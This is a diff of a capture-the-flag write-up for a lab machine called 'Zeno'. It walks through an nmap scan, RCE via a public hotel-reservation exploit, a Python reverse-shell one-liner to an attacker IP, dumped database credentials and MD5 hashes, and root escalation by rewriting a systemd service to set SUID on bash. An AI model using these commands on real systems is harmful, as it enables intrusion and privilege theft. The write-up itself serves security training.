@@ -4,6 +4,8 @@
 
 ## Reconnaissance
 
+I started running nmap and I got the following result.
+
 ```
 $ nmap -p- -sV -sC -Pn 10.65.187.29
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-18 05:25 -0500
@@ -28,7 +30,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 211.64 seconds
 ```
 
-By accessing the port `12340`, I got thus following page.
+By accessing the port `12340`, I got this following page.
 
 <figure><img src="zeno-1.png" alt=""><figcaption></figcaption></figure>
 
@@ -72,60 +74,62 @@ I found previously an admin page, accessing it I noticed a "Pathfinder Hotel Res
 
 Using this following exploit, I got a RCE.
 
-https://www.exploit-db.com/exploits/47520
+{% embed url="https://www.exploit-db.com/exploits/47520" %}
 
 <figure><img src="zeno-4.png" alt=""><figcaption></figcaption></figure>
 
-Accessing the page, I was able to 
+Accessing the page, I was able to run an `id` command.
 
 <figure><img src="zeno-5.png" alt=""><figcaption></figcaption></figure>
+
+Since I was able to run a command on the server, I used this command to get a reverse shell.
 
 ```
 export RHOST="192.168.130.101";export RPORT=1337;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
 ```
 
+<figure><img src="zeno-6.png" alt=""><figcaption></figcaption></figure>
 
-```
-cat <<EOF > /etc/systemd/system/zeno-monitoring.service
-[Unit]
-Description=Zeno monitoring
+But when I tried to read the first flag `user.txt`, I noticed that I didn't have permission to do that.
 
-[Service]
-Type=simple
-User=root
-ExecStart=/bin/bash -c "chmod +s /bin/bash"
+<figure><img src="zeno-7.png" alt=""><figcaption></figcaption></figure>
 
-[Install]
-WantedBy=multi-user.target
-EOF
-```
+I tried to find some credential to access as `edward`. I found some credentials to access MySQL. 
 
+<figure><img src="zeno-8.png" alt=""><figcaption></figcaption></figure>
 
-    $conn = mysqli_connect("127.0.0.1", "root", "veerUffIrangUfcubyig", "dbrms");
+Accessing MySQL, I noticed that the users was saved on `members` table.
 
+<figure><img src="zeno-9.png" alt=""><figcaption></figcaption></figure>
 
-```
-MariaDB [dbrms]> select * from members;
-+-----------+-----------+----------+--------------------------+----------------------------------+-------------+----------------------------------+
-| member_id | firstname | lastname | login                    | passwd                           | question_id | answer                           |
-+-----------+-----------+----------+--------------------------+----------------------------------+-------------+----------------------------------+
-|        15 | Stephen   | Omolewa  | omolewastephen@gmail.com | 81dc9bdb52d04dc20036dbd8313ed055 |           9 | 51977f38bb3afdf634dd8162c7a33691 |
-|        16 | John      | Smith    | jsmith@sample.com        | 1254737c076cf867dc53d60a0364f38e |           8 | 9f2780ee8346cc83b212ff038fcdb45a |
-|        17 | edward    | zeno     | edward@zeno.com          | 6f72ea079fd65aff33a67a3f3618b89c |           8 | 6f72ea079fd65aff33a67a3f3618b89c |
-|        18 | niz       | yuu      | niz@test.com             | 202cb962ac59075b964b07152d234b70 |           8 | 202cb962ac59075b964b07152d234b70 |
-+-----------+-----------+----------+--------------------------+----------------------------------+-------------+----------------------------------+
-```
+I was able to get a hash from all users, but I couldn't find the password of `edward`.
 
+<figure><img src="zeno-10.png" alt=""><figcaption></figcaption></figure>
+## Login as `edward`
 
-john
+I ran Linpeas script, and I found the password for `edward` on `/etc/fstab` file. 
 
-|                                  |     |           |
-| -------------------------------- | --- | --------- |
-| 1254737c076cf867dc53d60a0364f38e | md5 | jsmith123 |
-stephen 1234
+<figure><img src="zeno-11.png" alt=""><figcaption></figcaption></figure>
 
+Since I was able to login as `edward`, I read the `user.txt`flag.
+
+<figure><img src="zeno-12.png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
+
+Also running Linpeas, I knew that I could edit the `zeno-monitoring.service` file located on `/etc/systemd/system`.
+
+<figure><img src="zeno-13.png" alt=""><figcaption></figcaption></figure>
+
+Taking a look on this script, we can see that it executes a `/root/zeno-monitoring.py` file.
+
+<figure><img src="zeno-14.png" alt=""><figcaption></figcaption></figure>
+
+Running `sudo -l` command, we can notice that we have permission to run `reboot` command. We can combine these two things to escalate our privilege.
+
+<figure><img src="zeno-15.png" alt=""><figcaption></figcaption></figure>
+
+First, I'm going to edit the `zeno-monitoring.service` file to get a shell. 
 
 ```
 cat << EOF > /etc/systemd/system/zeno-monitoring.service
@@ -142,31 +146,14 @@ WantedBy=multi-user.target
 EOF
 ```
 
-
-```
-
-
--rw-------. 1 edward edward 1 Sep 21  2021 /home/edward/.ssh/authorized_keys
-
--rw-r--r--. 1 root root 162 Jun  8  2021 /etc/ssh/ssh_host_ecdsa_key.pub
--rw-r--r--. 1 root root 82 Jun  8  2021 /etc/ssh/ssh_host_ed25519_key.pub
--rw-r--r--. 1 root root 382 Jun  8  2021 /etc/ssh/ssh_host_rsa_key.pub
--rw-r--r--. 1 root root 1665 May 12  2006 /usr/share/doc/pygpgme-0.3/tests/keys/key1.pub
--rw-r--r--. 1 root root 3181 May 12  2006 /usr/share/doc/pygpgme-0.3/tests/keys/key2.pub
--rw-r--r--. 1 root root 908 May 12  2006 /usr/share/doc/pygpgme-0.3/tests/keys/passphrase.pub
--rw-r--r--. 1 root root 1454 May 12  2006 /usr/share/doc/pygpgme-0.3/tests/keys/revoked.pub
--rw-r--r--. 1 root root 4046 May 12  2006 /usr/share/doc/pygpgme-0.3/tests/keys/signonly.pub
-
-```
-
-
-```
-,username=zeno,password=FrobjoodAdkoonceanJa
-```
-
+After that, I'm going to reboot 
 
 ```
 [edward@zeno home]$ sudo /usr/sbin/reboot 
 ```
 
-/home/edward/bash -p
+Using `/home/edward/bash -p` we got a shell as a root. I was able to read the `root.txt` flag.
+
+<figure><img src="zeno-16.png" alt=""><figcaption></figcaption></figure>
+
+
